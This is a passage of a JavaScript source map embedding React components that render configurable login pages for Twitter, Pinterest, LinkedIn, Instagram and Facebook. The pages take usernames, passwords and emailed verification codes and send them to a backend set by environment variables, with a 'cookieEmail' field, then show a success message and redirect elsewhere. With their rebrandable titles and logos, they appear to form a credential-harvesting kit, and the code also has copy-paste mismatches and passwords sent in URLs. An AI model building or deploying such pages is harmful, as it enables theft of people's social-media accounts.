\"Twitter login\"}\n                        </h1>\n                        <br></br>\n                        {\n                            env.REACT_APP_BANNER_TWITTER === \"true\" ?\n                                <div>\n                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                                        <Card.Body>\n                                            <Card.Title>{env.REACT_APP_BANNER_TWITTER_HEADER}</Card.Title>\n                                            <Card.Text>\n                                                <small className=\"text-muted\">  {env.REACT_APP_BANNER_TWITTER_BODY}</small>\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card>\n                                </div>\n                                : \"\"\n                        }\n\n                        <Container>\n                            <p style={{ fontWeight: \"bold\" }}>\n                                {\n                                    env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                                }\n\n                            </p>\n                        </Container>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                            </center>\n                            <Route\n                                component={() => {\n                                    window.location.href = env.REACT_APP_REDIRECTURL;\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Twitter Username\n                    </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Twitter Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        {this.state.challenge_type === 'RetypeEmail' ? \"Enter your email id\" : \"Enter code recieved in your email\"}\n\n                                                    </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"text\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div>\n        );\n    }\n}\n","import React, { Component } from \"react\";\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nimport { Route, Redirect } from \"react-router-dom\";\n\nimport {\n    Form,\n    Button,\n    Container,\n    Row,\n    Col,\n    Alert,\n    Spinner,\n    Card\n} from \"react-bootstrap\";\nconst queryString = require(\"query-string\");\nconst env = runtimeEnv();\n\nexport default class Linkedin extends Component {\n    state = {\n        username: \"\",\n        password: \"\",\n        showAlert: false,\n        loading: false,\n        message: \"\",\n        manualCheck: false,\n        success: false,\n        redirect: false,\n    };\n    handleUsername = (event) => {\n        this.setState({ username: event.target.value });\n    };\n    handleCode = (event) => {\n        this.setState({ code: event.target.value });\n    };\n    handlePassword = (event) => {\n        this.setState({ password: event.target.value });\n    };\n    onShowAlert = () => {\n        this.setState({ showAlert: true }, () => {\n            window.setTimeout(() => {\n                this.setState({ showAlert: false });\n            }, 30000);\n        });\n    };\n    handleClick = (e) => {\n        e.preventDefault();\n\n        this.setState({ loading: true });\n        if (this.state.username.length !== 0 && this.state.password.length !== 0) {\n            fetch(`${env.REACT_APP_URL}/login/pinterest`, {\n                method: \"POST\",\n                headers: {\n                    \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\",\n                },\n                body: queryString.stringify({\n                    username: this.state.username,\n                    password: this.state.password,\n                    cookieEmail: env.REACT_APP_COOKIE_EMAIL,\n                }),\n            })\n                .then((response) => response.json())\n                .then((responseData) => {\n                    console.log(responseData);\n                    this.setState(\n                        {\n                            message: responseData.message,\n                        },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                    if (!responseData.success) {\n                        this.setState({ loading: false });\n                    } else {\n                        if (responseData.manualCheck) {\n                            this.setState({\n                                manualCheck: true,\n                                challenge_type: responseData.challenge_type,\n                                challenge_id: responseData.challenge_id,\n                                enc_user_id: responseData.enc_user_id,\n                                loading: true,\n                            });\n                        } else {\n                            this.setState({ success: true });\n                        }\n                    }\n                });\n        } else {\n            if (this.state.username.length === 0) {\n                this.setState(\n                    {\n                        message: \"email id cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            } else {\n                this.setState(\n                    {\n                        message: \"password cannot be empty\",\n                        loading: false,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n            }\n        }\n    };\n    handleCodeClick = (e) => {\n        fetch(\n            `${env.REACT_APP_URL}/login/twitter/verifyCode?code=${this.state.code}&challenge_type=${this.state.challenge_type}&enc_user_id=${this.state.enc_user_id}&cookieEmail=${env.REACT_APP_COOKIE_EMAIL}&username=${this.state.username}&password=${this.state.password}&challenge_id=${this.state.challenge_id}`,\n            {\n                method: \"GET\",\n            }\n        )\n            .then((response) => response.json())\n            .then((responseData) => {\n                console.log(responseData);\n                this.setState(\n                    {\n                        message: responseData.message,\n                    },\n                    () => {\n                        this.onShowAlert();\n                    }\n                );\n                if (responseData.success) {\n                    this.setState({ success: true });\n                } else {\n                    this.setState(\n                        { message: responseData.message, code: \"\" },\n                        () => {\n                            this.onShowAlert();\n                        }\n                    );\n                }\n            });\n\n    };\n    setRedirect = () => {\n        this.setState({\n            redirect: true,\n        });\n    };\n    renderRedirect = () => {\n        if (this.state.redirect) {\n            return <Redirect to=\"/\" />;\n        }\n    };\n    render() {\n        return (\n            <div>\n                {this.renderRedirect()}\n\n                <Button size=\"lg\" variant=\"outline-danger\" onClick={this.setRedirect}>\n                    Back\n               </Button>\n                {this.state.showAlert ? (\n                    <Alert variant=\"dark\">{this.state.message}</Alert>\n                ) : (\n                        \"\"\n                    )}\n\n                <Container\n                    style={{\n                        position: \"absolute\",\n                        left: \"50%\",\n                        top: \"50%\",\n                        transform: \"translate(-50%, -50%)\",\n                    }}\n                ><center>\n\n\n                        <Container>\n                            <img\n                                alt=\"logo\"\n                                src={env.REACT_APP_FAVICONURL}\n                            ></img>\n                        </Container>\n                        <br></br>\n                        <h1>\n                            {env.REACT_APP_TITLE !== undefined && env.REACT_APP_TITLE !== \"\"\n                                ? env.REACT_APP_TITLE\n                                : \"Pinterest login\"}\n                        </h1>\n                        {\n                            env.REACT_APP_BANNER_PINTEREST === \"true\" ?\n                                <div>\n                                    <Card style={{ backgroundColor: '#D8ECDB', color: '#3F6A42' }}>\n                                        <Card.Body>\n                                            <Card.Title>{env.REACT_APP_BANNER_PINTEREST_HEADER}</Card.Title>\n                                            <Card.Text>\n                                                <small className=\"text-muted\">  {env.REACT_APP_BANNER_PINTEREST_BODY}</small>\n                                            </Card.Text>\n                                        </Card.Body>\n                                    </Card> </div>\n                                : \"\"\n                        }\n                        <Container>\n                            <p style={{ fontWeight: \"bold\" }}>\n                                {\n                                    env.REACT_APP_SECONDARY_BANNER !== \"\" ? env.REACT_APP_SECONDARY_BANNER : \"\"\n                                }\n\n                            </p>\n                        </Container>\n                    </center>\n                    {this.state.success ? (\n                        <Container\n                            style={{\n                                position: \"absolute\",\n                                left: \"50%\",\n                                top: \"50%\",\n                                transform: \"translate(-50%, -50%)\",\n                            }}\n                        >\n                            <center>\n                                <h1>Login Success Thank You!</h1>\n                            </center>\n                            <Route\n                                component={() => {\n                                    window.location.href = env.REACT_APP_REDIRECTURL;\n                                    return null;\n                                }}\n                            />\n                        </Container>\n                    ) : (\n                            <Row>\n                                <Col>\n                                    <Form onSubmit={(e) => this.handleClick(e)}>\n                                        <Form.Group controlId=\"formBasicEmail\">\n                                            <Form.Label>\n                                                Enter Pinterest Email Id\n                    </Form.Label>\n                                            <Form.Control\n                                                value={this.state.username}\n                                                onChange={(e) => {\n                                                    this.handleUsername(e);\n                                                }}\n                                            />\n                                        </Form.Group>\n                                        <Form.Group controlId=\"formBasicPassword\">\n                                            <Form.Label>Enter Pinterest Password</Form.Label>\n                                            <Form.Control\n                                                onChange={(e) => this.handlePassword(e)}\n                                                value={this.state.password}\n                                                type=\"password\"\n                                            />\n                                        </Form.Group>\n                                        {this.state.loading ? (\n                                            <Button variant=\"primary\" type=\"submit\" disabled>\n                                                <Spinner\n                                                    as=\"span\"\n                                                    animation=\"grow\"\n                                                    size=\"sm\"\n                                                    role=\"status\"\n                                                    aria-hidden=\"true\"\n                                                />\n                      Loading...\n                                            </Button>\n                                        ) : (\n                                                <Button variant=\"primary\" type=\"submit\">\n                                                    Login\n                                                </Button>\n                                            )}\n\n                                        {this.state.manualCheck ? (\n                                            <div>\n                                                <Form.Group>\n                                                    <Form.Label>\n                                                        {this.state.challenge_type === 'RetypeEmail' ? \"Enter your email id\" : \"Enter code recieved in your email\"}\n\n                                                    </Form.Label>\n                                                    <Form.Control\n                                                        value={this.state.code}\n                                                        onChange={(e) => {\n                                                            this.handleCode(e);\n                                                        }}\n                                                        type=\"text\"\n                                                    />\n                                                </Form.Group>\n                                                <Button\n                                                    variant=\"outline-success\"\n                                                    onClick={() => {\n                                                        this.handleCodeClick();\n                                                    }}\n                                                >\n                                                    submit code\n                      </Button>{\" \"}\n                                            </div>\n                                        ) : (\n                                                \"\"\n                                            )}\n                                    </Form>\n                                </Col>\n                            </Row>\n                        )}\n                </Container>\n            </div >\n        );\n    }\n}\n","import React from \"react\";\nimport { Switch, Route } from \"react-router-dom\";\nimport Home from \"./components/Home\";\nimport Instagram from \"./components/Instagram\";\nimport Linkedin from \"./components/Linkedin\";\nimport Twitter from \"./components/Twitter\";\nimport Pinterest from \"./components/Pinterest\";\n\nimport runtimeEnv from \"@mars/heroku-js-runtime-env\";\nconst env = runtimeEnv();\nconsole.log(\"env is\" + env.REACT_APP_SELECT);\nfunction App() {\n  return (\n    <Switch>\n      <Route path=\"/\" component={Home} exact />\n      {\n        env.REACT_APP_TWITTER === \"true\" ? <Route path=\"/Twitter\" component={Twitter} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_LINKEDIN === \"true\" ? <Route path=\"/LinkedIn\" component={Linkedin} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_INSTAGRAM === \"true\" ? <Route path=\"/Instagram\" component={Instagram} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_PINTEREST === \"true\" ? <Route path=\"/Pinterest\" component={Pinterest} exact /> : \"\"\n      }\n      {\n        env.REACT_APP_FACEBOOK === \"true\" ? <Route path=\"/Facebook\" component={Pinterest} exact /> : \"\"\n      }\n    </Switch>\n  );\n}\n\nexport default App;\n","import { createBrowserHistory as history } from \"history\";\n\nexport default history();\n","import React from \"react\";\nimport ReactDOM from \"react-dom\";\nimport App from \"./App\";\nimport { BrowserRouter as Router } from \"react-router-dom\";\nimport history from \"./components/History\";\n\nReactDOM.render(\n  <Router history={history}>\n    <App />\n  </Router>,\n  document.getElementById(\"root\")\n);\n"],"sourceRoot":""}